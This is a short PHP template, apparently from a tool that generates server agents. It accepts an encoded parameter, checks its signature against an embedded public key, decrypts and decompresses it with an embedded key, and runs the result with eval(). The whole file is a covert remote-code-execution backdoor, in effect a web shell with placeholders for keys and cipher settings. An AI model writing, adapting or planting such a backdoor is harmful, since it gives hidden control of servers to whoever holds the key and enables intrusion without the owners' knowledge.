<?php
if (isset($_POST['p'])) {
  $p = $_POST['p'];
} elseif (isset($_GET['p'])) {
  $p = $_GET['p'];
} else {
  header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
  header('Content-Type: text/html');
  ?>{{get_to_post.php}}<?php
  exit(1);
}
$d = base64_decode(str_replace(' ', '+', $p));
$s = substr($d, 0, {{signature_length}});
$d = substr($d, {{signature_length}});
$a = <<<EOF
{{author.pub}}
EOF;
if (1 !== openssl_verify($d, $s, $a, {{signature_digest}})) {
  header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
  exit(1);
}

$k = base64_decode('{{web.key}}');
$i = substr($d, 0, {{cipher_iv_length}});
$d = substr($d, {{cipher_iv_length}});
$d = openssl_decrypt($d, '{{cipher}}', $k, OPENSSL_RAW_DATA, $i);
$d = gzinflate($d);
if ($d[0] == '<') {
  $d = '?>' . $d;
}
eval($d);
